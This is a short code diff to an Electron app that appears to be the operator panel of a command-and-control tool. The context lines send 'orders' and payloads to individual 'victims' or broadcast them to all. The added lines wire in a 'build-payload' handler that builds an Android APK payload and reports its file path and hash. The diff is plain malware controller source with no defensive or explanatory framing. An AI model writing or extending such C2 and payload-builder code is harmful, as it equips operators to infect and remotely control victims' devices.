@@ -10,6 +10,7 @@ const { app, BrowserWindow, ipcMain, screen } = require("electron");
 const path = require("path");
 
 const { startServer } = require("./server.js");
+const { buildApk } = require("./builder.js");
 
 const PRELOAD = path.join(__dirname, "preload.js");
 const RENDERER = path.join(__dirname, "renderer");
@@ -124,6 +125,19 @@ ipcMain.on("order", (_e, arg) => {
   if (!c2) return;
   if (arg && arg.victim) c2.sendOrder(arg.victim, arg.payload);
   else c2.broadcastOrder(arg.payload);
+});
+
+ipcMain.on("build-payload", (_e, config) => {
+  const log = (line) => sendAll("log", line);
+  log("[builder] payload build requested");
+  buildApk(config || {}, {
+    onLog: log,
+    onDone: (r) => {
+      sendAll("build-done", r);
+      log(r.ok ? `[*] build done: ${r.apk} (sha256 ${r.sha256})`
+              : `[!] build failed: ${r.error || "unknown"}`);
+    },
+  });
 });
 
 ipcMain.on("open-lab", (_e, victimId) => {
